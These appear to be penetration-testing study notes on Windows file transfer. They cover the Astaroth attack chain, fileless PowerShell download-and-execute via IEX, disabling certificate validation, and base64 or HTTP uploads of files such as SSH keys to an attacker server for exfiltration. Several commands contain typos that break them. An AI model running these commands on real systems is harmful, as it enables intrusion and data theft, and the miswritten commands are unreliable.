
Windows file Attack example: Astaroth Attack
steps:
- A malicious link in a spear-phishing email led to an LNK file.
- When double-clicked, the LNK file caused the execution of the ***WMIC too***l with the "/Format" parameter, which allowed the download and execution of malicious ***JavaScript*** code.
- The ***JavaScript*** code, in turn, download payloads by abusing the ***Bitsadmin tool*** 
## PowerShell Base64 encode & Decode

- if terminal/powershell is in access, the attacker can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. 
	- ***Terminal:***
		`md5sum file_name`
		`cat file_name | base64 -w 0; echo`
		`<hashvalue_id_rsa> 
	
	- ***Powershell:***
		`[IO.File]::WriteAllBytes("<Downloaded_file_path>", [Convert]::FromBase64String(hashvalu_id_rsa))`
		
		- confirm the file transfer using `Get-FileHash` {if the hash value of md5sum is matched to the hash value of `Get-FileHash` then the file is transfered successfully. 
		
			`Get-FileHash Downloaded_file_path -Algorithm md5`

# PowerShell Web Downloads
- Most companies allow `Http` and `Https` outbound traffic through the firewall to allow productivity.
- Leveraging these transportation methods for file transfer is very convenient.
- Defenders can use web filtering solutions to prevent access to specific website categories, block the download of file types, or only allow access to list of whitelisted domains in more restricted networks.
 - In any version of PowerShell:
	 - The ***System.Net.WebClient*** class can be used to download a file over Http, Https or FTP  
	 - ***WebClient*** method for downloading data from a resource:
	 
		 1. ***OpenRead*** | Returns the data from a resource as a Stream.

		 2. ***OpenReadAsync*** | Returns the data from a resource without blocking the calling thread.

		 3. ***DownloadData*** | Returns a Byte array.

		 4. ***DownloadDataAsync*** | Returns a Byte array without blocking the calling thread.

		 5. ***DownloadFile*** | Downloads data from a resource to local file.

		 6. ***DownloadFileAsync*** | Downloads data from a resource to local file without blocking the calling thread.

		 7. ***DownloadString*** | Downloads a String from a resource and return a String 

		 8. ***DownloadStringAsync*** |  Downloads a String from a resource and return a String without blocking the calling thread.



1. ***PowerShell DownloadFile Method***

	`(New-Object Net.WebClient).Download('<Target File URL>', '<Output file Name>')`

2. ***PowerShell DownloadString - Fileless Method***

	- `(New-Object Net.WebClient).DownloadingString('URL')`
	
	- `(New-Object Net.WebClient).DownloadingString('URL/Invoke-Expressions') | IEX`


3. ***PowerShell ==Invoke-WebRequest***==

	- `Invoke-WebRequest <URL> -OutFile <File_Name>.ps1`

#### Common Errors with PowerShell:


- Parsed error:
	1. The Internet Explorer first-launch configuration has not been completed, which prevents the download which throws an error 
	
		- `Invoke-WebRequest https://<ip>/<ps1 script> | IEX` 
		
		 ***-UseBasicParsing Bypasses The error***
		 
		- `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`

	1.  PowerShell downloads error related to the SSL/TLS secure channel if the certificate is not trusted.
	
		-  `IEX(New.Object Net.WebClient).Downloading('URL.ps1')`
		
		 `Can be bypassed by using some commands`
		
		- `[System.Net.ServicePointManager]::ServerCertificateValidationCallback ={$true}`

## SMB Downloads

- The Server Message Block protocol (==SMB== protocol) that runs on port ==TCP/445==
- It enables application and users to transfer files to and from remote server.
	-  ***To create SMB Server***
		- impacket-smbserver share -smb2support /tmp/smbshare 
	
	- ***To Copy from the SMB server***
		- `copy \\<IP>\<file_path from the target> <locaol_destination_path>` {for cmd}
		- `copy \\<IP>\<file_path from the target> -Destination <locaol_destination_path> {for powershell}
	
	- ***To copy from authenticated and authorized SMB server***
		- Mount the smb server if error is received from copy `\\<IP>\<file_path from the target> <locaol_destination_path>`
	
			- `net use n: \\<IP>\share /user:<username>:<password>`
		
			- `copy n:\<file_name>`

## FTP Downloads
- Another way to transfer files is using ==FTP== (File Transfer Protocol) which uses port ==TCP/21== and ==TCP/20==.
- The FTP client or PowerShell Net.WebClient to download files from an FTP server. 
- Configure an FTP Server using ***pyftpdlib***  module.
- ***Installing the FTP Server Python3 Module - pyftpdlib***

	- `pip3 install pyftpdlib`
	- `by default pyftpdlib uses port 2121`
	
- ***Setting up a Pyhon3 FTP Server on port 21***

	- `python3 -m pyftpdlib --port 21`
	
- ***Transferring Files from an FTP Server Using PowerShell***

	- `(New-Object Net.WebClient).DownloadFile('ftp://IP/file', 'Destination_path_with_file_name')`

### Create a Command File for the FTP Client and Download the Target File

- cmd:
	- `echo open <target_ip> > ftpcommand.txt`
	- `echo USER <user_name> >> ftpcommand.txt`
	- `echo binary >> ftpcommand.txt`
	- `echo GET file.txt >> ftpcommand.txt`
	- `echo bye >> ftpcommand.txt`
	- remote shell:
		- `ftp -v -n -s:ftpcommand.txt`
		- `open <target_ip>`
		- `USER <user_name>`
		- `GET file.txt`
		- `bye`

# Upload Operations
- Situation like password cracking, analysis, exfiltration, etc.
- Where the file must upload from the target

### PowerShell Base64 Encode & Decode:

- Encode base64 string using Powershell:
	- `[Convert]::ToBase64String((Get-Content -path "<file_path>" -Encoding byte))`
	- `Get-FileHash "file_path" -Algorithm MD5 | select Hash`
	
- Decode base64 string in linux
	- `echo <hash_string> | base64 -d > <file_name>`
	- `md5sum hosts`

### PowerShell Web Uploads

- ==Invoke-WebRequest== or ==Invoke-RestMethod== can be used to build the upload function.
- Use ==PSUUpload.ps1== which uses Invoke-RestMethod to perform the uploads operations.
- It accepts two parameters 
	- -File
	- -Uri
- PowerShell Script to upload a File to Python Upload Server: 
	- `IEX(New-Object Net.WebCilent).Downloading('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`
	
	- `Invoke-FileUploads -Uri https://IP:port/uploads -File <File_path>`
		- {required to start a web-upload server}
		
	
- PowerShell and Netcat Base64 Web upload: 
	- `$b64 = [System.convert]::ToBaseString((Get-Content -path '<File_Path>' -Encoding Byte))`
	-  `Invoke-WebRequest -Uri https://Ip:port/ -Method POST -Body $b64`
	
	

# SMB Uploads
- Usually allow outbound traffic using HTTP(TCP/80) and HTTPS(TCP/443) protocols.
- Enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attack.
- An alternative way cab be to run SMB over HTTP with ==WebDav==. It is an extension of HTTP.
	- A protocol in which web browser and web server use to communicate with each other.
##### -Configuring WebDav Server:

- `pip3 install wsgidav cheroot`

##### -Using the WebDav Python module: 

- `wsgidav --host=<address> --port=<port> --root=/<add> --auth=<username>/anonymous`

##### -Connecting to the WebDav Share:

 - `dir \\<address>\DavWWWRoot`
##### -Uploading Files using SMB
 
 - `copy <file_path> \\Ip\DavWWWRoot\`
 - `copy <file_path> \\Ip\<Sharename>\`

# FTP Uploads

- FTP is very similar to downloading file.
- Use PowerShell or the FTP client to complete the  operation.
- In Python module pyftpdlib , the --write option is need to be mentioned in order to allow clients to upload files.
	- ==python3 -m pyftpdlib --port 21 --write==
##### PowerShell Upload File:
- `(New-Object Net.WebClient).UploadFile('ftp://IP/Destination_directory','<File_Path>')`

[[File Transfer]]
